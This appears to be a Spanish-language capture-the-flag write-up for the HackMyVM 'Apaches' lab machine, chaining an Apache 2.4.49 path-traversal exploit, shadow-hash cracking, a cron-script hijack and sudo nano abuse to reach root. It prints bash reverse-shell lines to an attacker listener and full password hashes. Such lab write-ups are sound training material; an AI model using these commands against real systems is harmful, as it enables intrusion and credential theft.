@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HackMyVM - Apaches | noname</title>
+<meta property="og:title" content="HackMyVM - Apaches | noname" />
+<meta name="twitter:title" content="HackMyVM - Apaches | noname" />
+<meta itemprop="name" content="HackMyVM - Apaches | noname" />
+<meta name="application-name" content="HackMyVM - Apaches | noname" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="Writeup Apaches 🟢">
+<meta itemprop="description" content="Writeup Apaches 🟢" />
+<meta property="og:description" content="Writeup Apaches 🟢" />
+<meta name="twitter:description" content="Writeup Apaches 🟢" />
+
+<meta property="og:locale" content="es" />
+<meta name="language" content="es" />
+
+
+
+  <meta itemprop="image" content="https://0x-noname.github.io/machines/hmv/apaches/apaches_logo.webp" />
+  <meta property="og:image" content="https://0x-noname.github.io/machines/hmv/apaches/apaches_logo.webp" />
+  <meta name="twitter:image" content="https://0x-noname.github.io/machines/hmv/apaches/apaches_logo.webp" />
+  <meta name="twitter:image:src" content="https://0x-noname.github.io/machines/hmv/apaches/apaches_logo.webp" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-08-01T13:00:42&#43;0200 />
+    <meta property="article:published_time" content=2023-08-01T13:00:42&#43;0200 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "HackMyVM - Apaches",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-08-01",
+        "description": "Writeup Apaches 🟢",
+        "wordCount":  962 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-08-01",
+        "image": {
+        "@type": "imageObject",
+        "url": "\/machines\/hmv\/apaches\/apaches_logo.webp"
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "noname"
+        }
+    }
+    </script>
+
+
+
+<meta name="generator" content="Hugo 0.111.3">
+
+    
+
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/hmv/apaches/">
+    <link href="/style.min.0dafdc75467b093a9691e40fa17265d2fe1f3baba37da4faf9af6a1b0b035248.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "" class="notransition">
+<script src="/js/themeLoader.min.3c3396ae9effcbd02e7064baa7b435ffe6560bcd7fec0b428a470d3a128f2220.js"></script>
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://0x-noname.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        $ home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackmyvm/">
+                        $ hmv
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackthebox/">
+                        $ htb
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/vulnyx/">
+                        $ nyx
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/whoami/">
+                        $ whoami
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HackMyVM - Apaches</h1>
+                
+                <div class="post-meta">
+                    <time datetime="2023-08-01T13:00:42&#43;02:00" itemprop="datePublished"> Aug 1, 2023 </time>
+                </div>
+            </header><div class="page-content">
+                <p><img src="/../machines/hmv/apaches/apaches_logo.webp" alt="logo"></p>
+<ul>
+<li><em>Path Traversal &amp; Remote Code Execution</em></li>
+<li><em>Brute Force Shadow Hashes</em></li>
+<li><em>Cron Job Abuse</em></li>
+<li><em>Leaked Credentials</em></li>
+<li><em>Abusing Nano Binary</em></li>
+</ul>
+<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nmap -p- -v -T5 -n 192.168.1.14
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nmap -sVC -v -p 22,80 192.168.1.14
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   3072 bc95836ec46238b5a9940c14a3bf5734 (RSA)
+</span></span><span style="display:flex;"><span>|   256 07fa461acaf3dc082f728ce2f22e32e5 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 46ff72d567c51f87b1358429f3ade83a (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.49 ((Unix))
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.49 (Unix)
+</span></span><span style="display:flex;"><span>|_http-title: Apaches
+</span></span><span style="display:flex;"><span>| http-robots.txt: 1 disallowed entry 
+</span></span><span style="display:flex;"><span>|_/
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|   Supported Methods: HEAD GET POST OPTIONS TRACE
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-favicon: Unknown favicon MD5: EB49C4A639D3960EE7DDD07BC9F832B7
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h3 id="http-tcp-80">HTTP-TCP 80</h3>
+<p><img src="/../machines/hmv/apaches/puerto%2080.webp" alt="puerto 80"></p>
+<p>Archivo robots.txt</p>
+<p><img src="/../machines/hmv/apaches/robots.webp" alt="robots"></p>
+<p>Decodifico la cadena en base64.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ echo <span style="color:#e6db74">&#34;IOKAnFlvdSBrbm93IHlvdXIgcGF0aCwgY2hpbGQsIG5vdyBmb2xsb3cgaXQu4oCdCi0tIFBvY2Fob250YXMg&#34;</span> | base64 -d;echo
+</span></span><span style="display:flex;"><span> “You know your path, child, now follow it.”
+</span></span><span style="display:flex;"><span>-- Pocahontas
+</span></span></code></pre></div><p>Buscando información de <code>Apache/2.4.49</code> he encontrado este <a href="https://www.exploit-db.com/exploits/50383">exploit</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ bash poc.sh targets.txt /bin/sh &#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.1.18/4444 0&gt;&amp;1&#39;&#34;
+</span></span></code></pre></div><p>Ontengo la shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nc -lvnp 4444
+</span></span><span style="display:flex;"><span>listening on [any] 4444 ...
+</span></span><span style="display:flex;"><span>connect to [192.168.1.18] from (UNKNOWN) [192.168.1.14] 57190
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group (650): Inappropriate ioctl for device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>daemon@apaches:/usr/bin$
+</span></span></code></pre></div><p>Usando metodología básica veo el archivo <strong>shadow</strong> tiene permisos de lectura.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>daemon@apaches:/$ ls -la /etc/shadow
+</span></span><span style="display:flex;"><span>ls -la /etc/shadow
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 root shadow 1434 Oct 10  2022 /etc/shadow
+</span></span></code></pre></div><p>Ahora en mi máquina creo dos archivos, uno con el nombre <strong>passwd</strong> y otro con el nombre <strong>shadow</strong>. En el archivo <strong>passwd</strong> copio el contenido del fichero <strong>passwd</strong> de la máquina víctima.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>geronimo:x:1000:1000:geronimo:/home/geronimo:/bin/bash
+</span></span><span style="display:flex;"><span>squanto:x:1001:1001:,,,:/home/squanto:/bin/bash
+</span></span><span style="display:flex;"><span>sacagawea:x:1002:1002:,,,:/home/sacagawea:/bin/bash
+</span></span><span style="display:flex;"><span>pocahontas:x:1003:1003:,,,:/home/pocahontas:/bin/bash
+</span></span></code></pre></div><p>En el archivo <strong>shadow</strong> copio el contenido del fichero <strong>shadow</strong> de la máquina víctima.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>geronimo:$6$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
+</span></span><span style="display:flex;"><span>squanto:$6$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
+</span></span><span style="display:flex;"><span>sacagawea:$6$7jhI/21/BZR5KyY6$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::
+</span></span><span style="display:flex;"><span>pocahontas:$6$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::
+</span></span></code></pre></div><p>Con <strong>unshadow</strong> creo el hash.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ unshadow passwd shadow &gt; hash_users
+</span></span></code></pre></div><p>Realizo fuerza burta a los hashes encontrados y encuentro la contraseña del usuario <strong>squanto</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ john hash_users --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded 4 password hashes with 4 different salts (crypt, generic crypt(3) [?/64])
+</span></span><span style="display:flex;"><span>Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 6 for all loaded hashes
+</span></span><span style="display:flex;"><span>Cost 2 (algorithm specific iterations) is 5000 for all loaded hashes
+</span></span><span style="display:flex;"><span>Will run 4 OpenMP threads
+</span></span><span style="display:flex;"><span>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span style="display:flex;"><span>i*******e        (squanto)
+</span></span></code></pre></div><p>Me conecto como usuario squanto</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ ssh squanto@192.168.1.14
+</span></span><span style="display:flex;"><span>                                                                                
+</span></span><span style="display:flex;"><span>                                                                                
+</span></span><span style="display:flex;"><span>                                                                                
+</span></span><span style="display:flex;"><span>                                                                  
+</span></span><span style="display:flex;"><span>                                                                        &gt;&gt;       &gt;======&gt;         &gt;&gt;           &gt;=&gt;    &gt;=&gt;    &gt;=&gt; &gt;=======&gt;   &gt;=&gt;&gt;=&gt;   
+</span></span><span style="display:flex;"><span>                                                                       &gt;&gt;=&gt;      &gt;=&gt;    &gt;=&gt;      &gt;&gt;=&gt;       &gt;=&gt;   &gt;=&gt; &gt;=&gt;    &gt;=&gt; &gt;=&gt;       &gt;=&gt;    &gt;=&gt; 
+</span></span><span style="display:flex;"><span>                                                                      &gt;&gt; &gt;=&gt;     &gt;=&gt;    &gt;=&gt;     &gt;&gt; &gt;=&gt;     &gt;=&gt;        &gt;=&gt;    &gt;=&gt; &gt;=&gt;        &gt;=&gt;       
+</span></span><span style="display:flex;"><span>                          ~                                          &gt;=&gt;  &gt;=&gt;    &gt;======&gt;      &gt;=&gt;  &gt;=&gt;    &gt;=&gt;        &gt;=====&gt;&gt;=&gt; &gt;=====&gt;      &gt;=&gt;     
+</span></span><span style="display:flex;"><span>                    7~   ~&amp;.                                        &gt;=====&gt;&gt;=&gt;   &gt;=&gt;          &gt;=====&gt;&gt;=&gt;   &gt;=&gt;        &gt;=&gt;    &gt;=&gt; &gt;=&gt;             &gt;=&gt;  
+</span></span><span style="display:flex;"><span>                    G!J !75!   ~G     :                            &gt;=&gt;      &gt;=&gt;  &gt;=&gt;         &gt;=&gt;      &gt;=&gt;   &gt;=&gt;   &gt;=&gt; &gt;=&gt;    &gt;=&gt; &gt;=&gt;       &gt;=&gt;    &gt;=&gt; 
+</span></span><span style="display:flex;"><span>                   ?~:B!. 5Y^!~^B. :~J&amp;                           &gt;=&gt;        &gt;=&gt; &gt;=&gt;        &gt;=&gt;        &gt;=&gt;    &gt;===&gt;   &gt;=&gt;    &gt;=&gt; &gt;=======&gt;   &gt;=&gt;&gt;=&gt;
+</span></span><span style="display:flex;"><span>                 .GG?~    B^...PB?!^ ?5 .                         
+</span></span><span style="display:flex;"><span>                7&amp;G:  7. JB7?7^..   ^&amp;P&amp;Y .7#                     If at first you don&#39;t succeed. Try, try again! Sometimes the second time returns more!
+</span></span><span style="display:flex;"><span>              .GG.  ~J. ?@5:  :~.  Y@@@@??!?#                     
+</span></span><span style="display:flex;"><span>             :#~  ~Y~  JJ  :77: .J&amp;@#57:  :&amp;!.~Y  .:              
+</span></span><span style="display:flex;"><span>            :&amp;. ^P7  ^J::!7^.:!YJ!:....  Y@@@@@&amp;J5@!              
+</span></span><span style="display:flex;"><span>            @7 Y5  :GP77~::~!~...:^:..:J#&amp;#GPJ!:.PG               
+</span></span><span style="display:flex;"><span>           P@~B# ^B@G~^^!!~^^^^:...^7J7.       ^BP^?:             
+</span></span><span style="display:flex;"><span>          ^@@@@@&amp;@#~7G5J7~::.:^~?JJ7~::^^~~~?B@@@@@&amp;              
+</span></span><span style="display:flex;"><span>          &amp;J!7?P#@B@@@B!:!?77???7!~~!!?J5PPP5YJ??YPYJ~.           
+</span></span><span style="display:flex;"><span>         ?P       :?B@&amp;#@#?7!^^~?55Y7^:..       .^?J5Y^           
+</span></span><span style="display:flex;"><span>         ?B^^^::..    ~G&amp;@#YP#&amp;@B!....::::^~75B&amp;@@@@#G!           
+</span></span><span style="display:flex;"><span>         :&amp;~J?P&amp;@@G?7!^..BG!~7B@#5J7!!7?JPGBB#BB&amp;&amp;@@B^            
+</span></span><span style="display:flex;"><span>         !5 ##J?PY    :JP&amp;    .@&amp;G5JY5GG57^:...   .~YBJ           
+</span></span><span style="display:flex;"><span>        ~5  :P7!^ ..^   ~@P~~~BB7^:.  .:~5G! .:!5B&amp;@G!!.          
+</span></span><span style="display:flex;"><span>       .P      ~PGB#5   P:5!B&amp;7~:Y&amp;#&amp;B&amp;&amp;#GPY7!!?5B@@&amp;G:           
+</span></span><span style="display:flex;"><span>       Y7   ^^ .5GGB!  5~!7:7!G:. 7B7?~^^?G#P!....:GP             
+</span></span><span style="display:flex;"><span>       .~^JJ^   .     .G #..J ##!  J#~..:.  .7P#?^:.              
+</span></span><span style="display:flex;"><span>          !Y:^. ?.    ~Y &amp;  7 PJ!P7^@@&amp;Y!^^.  .J&amp;Y                
+</span></span><span style="display:flex;"><span>           P!         ~P @. : Y&amp;  5GPJ#??~~?#G!!!7.               
+</span></span><span style="display:flex;"><span>           !?       ^?J&amp;.#J   B##: .  B7:.   5^                   
+</span></span><span style="display:flex;"><span>            !!^.:!PP^  !G!&amp;.  5^7?J   ?#:~~^.:B^                  
+</span></span><span style="display:flex;"><span>              .::..!?   .!JG. &amp;^  BG~.:@       .                  
+</span></span><span style="display:flex;"><span>                    JG!!^..5YYG5^ &amp;..~Y&amp;                          
+</span></span><span style="display:flex;"><span>                   .G...^?~  .  JB!    .                          
+</span></span><span style="display:flex;"><span>                   .G!7!:                                   
+</span></span><span style="display:flex;"><span>                   
+</span></span><span style="display:flex;"><span>squanto@192.168.1.14&#39;s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-128-generic x86_64)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System information as of Tue 01 Aug 2023 08:25:31 AM UTC
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load:  0.02               Processes:               126
+</span></span><span style="display:flex;"><span>  Usage of /:   20.0% of 39.07GB   Users logged in:         0
+</span></span><span style="display:flex;"><span>  Memory usage: 15%                IPv4 address for enp0s3: 192.168.1.14
+</span></span><span style="display:flex;"><span>  Swap usage:   0%
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+</span></span><span style="display:flex;"><span>   just raised the bar for easy, resilient and secure K8s cluster deployment.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>143 updates can be installed immediately.
+</span></span><span style="display:flex;"><span>2 of these updates are security updates.
+</span></span><span style="display:flex;"><span>To see these additional updates run: apt list --upgradable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>New release &#39;22.04.2 LTS&#39; available.
+</span></span><span style="display:flex;"><span>Run &#39;do-release-upgrade&#39; to upgrade to it.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>squanto@apaches:~$ 
+</span></span></code></pre></div><p>Después de realizar una búsqueda de archivos con permisos de escritura encuentro el archivo <code>backup.sh</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>squanto@apaches:~$ find / -writable 2&gt;/dev/null | grep -v -i -E &#39;proc|sys|dev|run&#39;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/home/sacagawea/Scripts/backup.sh
+</span></span></code></pre></div><p>Enumerando tareas cron veo que el usuario <strong>sacagawea</strong> lanza <code>backup.sh</code> cada 5 segundos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>squanto@apaches:~$ cat /etc/*crontab
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>#* 5 * * * * su sacagawea -c &#34;./home/sacagawea/Scripts/backup.sh&#34;
+</span></span></code></pre></div><p>Sabiendo esto y que tengo permisos de escritura añado el siguiente código al archivo <code>backup.sh</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.1.18/1337 0&gt;&amp;1&#34;
+</span></span></code></pre></div><p>Ahora espero un poco y obtengo una shell como usuario <strong>sacagawea</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nc -lvnp 1337
+</span></span><span style="display:flex;"><span>listening on [any] 1337 ...
+</span></span><span style="display:flex;"><span>connect to [192.168.1.18] from (UNKNOWN) [192.168.1.14] 59398
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group (42495): Inappropriate ioctl for device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>sacagawea@apaches:~$ id
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid=1002(sacagawea) gid=1002(sacagawea) groups=1002(sacagawea),1004(Lipan)
+</span></span></code></pre></div><p>Navegando en el home de sacagawea encuentro el directorio admin.</p>
+<p><img src="/../machines/hmv/apaches/admin.webp" alt="admin"></p>
+<p>Dentro de admin el archivo <code>2-check.php</code> encuentro unas credenciales.</p>
+<p><img src="/../machines/hmv/apaches/checkphp.webp" alt="checkphp"></p>
+<p>Me conecto como usuaria pocahontas.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>sacagawea@apaches:~/Development/admin$ su pocahontas
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span>pocahontas@apaches:/home/sacagawea/Development/admin$ id
+</span></span><span style="display:flex;"><span>uid=1003(pocahontas) gid=1003(pocahontas) groups=1003(pocahontas)
+</span></span></code></pre></div><p>Enumero permisos de sudo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>Matching Defaults entries for pocahontas on apaches:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User pocahontas may run the following commands on apaches:
+</span></span><span style="display:flex;"><span>    (geronimo) /bin/nano
+</span></span></code></pre></div><p>Con el siguiente recurso de <a href="https://gtfobins.github.io/gtfobins/nano/#sudo">gtfobins</a> consigo una shell como usuario <strong>geronimo</strong>.</p>
+<pre tabindex="0"><code>pocahontas@apaches:~$ sudo -u geronimo /bin/nano
+ctrl+R ctrl+X
+reset; bash 1&gt;&amp;0 2&gt;&amp;0
+geronimo@apaches:/home/pocahontas$ id
+uid=1000(geronimo) gid=1000(geronimo) groups=1000(geronimo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
+</code></pre><p>Enumero de nuevo permisos de sudo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>geronimo@apaches:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries for geronimo on apaches:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User geronimo may run the following commands on apaches:
+</span></span><span style="display:flex;"><span>    (ALL : ALL) ALL
+</span></span><span style="display:flex;"><span>    (ALL) NOPASSWD: ALL
+</span></span></code></pre></div><p>Obtengo el root de la siguiente forma.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>geronimo@apaches:~$ sudo su
+</span></span><span style="display:flex;"><span>root@apaches:/home/geronimo# id
+</span></span><span style="display:flex;"><span>uid=0(root) gid=0(root) groups=0(root)
